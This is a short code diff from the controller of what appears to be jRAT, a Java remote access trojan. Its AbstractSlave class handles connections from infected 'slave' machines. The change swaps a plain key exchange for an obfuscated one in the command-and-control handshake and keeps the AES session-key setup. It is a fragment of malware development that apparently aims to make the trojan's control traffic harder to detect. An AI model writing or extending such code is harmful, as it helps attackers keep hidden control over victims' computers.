@@ -19,7 +19,8 @@ import se.jrat.common.Version;
 import se.jrat.common.codec.Hex;
 import se.jrat.common.crypto.Crypto;
 import se.jrat.common.crypto.CryptoUtils;
-import se.jrat.common.crypto.KeyExchanger;
+import se.jrat.common.crypto.ObfuscatedStreamKeyExchanger;
+import se.jrat.common.crypto.StreamKeyExchanger;
 import se.jrat.controller.addons.PluginEventHandler;
 import se.jrat.controller.crypto.GlobalKeyPair;
 import se.jrat.controller.exceptions.CloseException;
@@ -124,10 +125,9 @@ public abstract class AbstractSlave implements Runnable {
 
 		Main.instance.getPanelLog().addEntry("Connect", this, "");
 		
-		KeyExchanger exchanger = new KeyExchanger(dis, dos, GlobalKeyPair.getKeyPair());
+		StreamKeyExchanger exchanger = new ObfuscatedStreamKeyExchanger(GlobalKeyPair.getKeyPair(), dis, dos);
 		exchanger.writePublicKey();
-		exchanger.readRemotePublicKey();
-		rsaKey = exchanger.getRemoteKey();
+		rsaKey = exchanger.readRemoteKey();
 		
         KeyGenerator keyGen = KeyGenerator.getInstance("AES");
         keyGen.init(128);
@@ -143,7 +143,7 @@ public abstract class AbstractSlave implements Runnable {
         dos.writeInt(encryptedIv.length);
         dos.write(encryptedKey);
         dos.write(encryptedIv);
-		
+        
 		if (Main.debug) {
 			Main.debug("Encryption key: " + Hex.encode(key));
 			Main.debug("Encryption IV: " + Hex.encode(iv));
